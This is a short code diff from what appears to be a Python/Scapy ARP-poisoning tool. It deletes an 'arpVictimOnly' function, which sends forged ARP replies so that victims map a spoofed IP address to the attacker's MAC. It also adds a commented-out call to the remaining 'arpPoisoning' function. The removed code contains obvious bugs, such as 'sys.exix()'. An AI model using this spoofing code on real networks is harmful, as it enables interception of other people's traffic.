@@ -56,24 +56,5 @@ def arpPoisoning(victimIP, spoofIP, networkInterface):
 
                     sendp(pktS, iface=networkInterface)
 
-
-def arpVictimOnly(victimIP, spoofIP, networkInterface):
-    attackerMAC = get_if_hwaddr(networkInterface)
-    victimMAC = [util.getMAC(ip, networkInterface) for ip in victimIP]
-    spoofMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]
-
-    if spoofMAC == None or attackerMAC == None or victimMAC == None:
-        print("Error occure! Attcker Mac : " + attackerMAC + "Victim Mac: " + victimMAC + "spoofing MAC :" + spoofMAC)
-        sys.exix()
-
-    for i in range(0, len(victimIP)):
-        for j in range(0, len(spoofIP)):
-            if victimIP[i] != spoofIP[j]:
-                pktV = Ether() / ARP()
-                pktV[Ether].src = attackerMAC
-                pktV[ARP].hwsrc = attackerMAC
-                pktV[ARP].psrc = spoofIP[j]
-                pktV[ARP].hwdst = victimMAC[i]
-                pktV[ARP].pdst = victimIP[i]
-
-                sendp(pktV, iface=networkInterface)
+                    
+#arpPoisoning([victimIP], [spoofIP], networkInterface)
